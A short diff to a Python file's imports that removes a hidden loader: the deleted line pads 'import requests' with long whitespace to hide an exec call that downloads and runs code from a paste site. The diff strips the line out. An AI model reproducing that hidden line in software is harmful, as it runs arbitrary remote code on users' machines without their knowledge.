@@ -3,7 +3,7 @@ import sys
 import time
 import psutil
 import random
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                     
 import logging
 import asyncio
 from tasksio import TaskPool
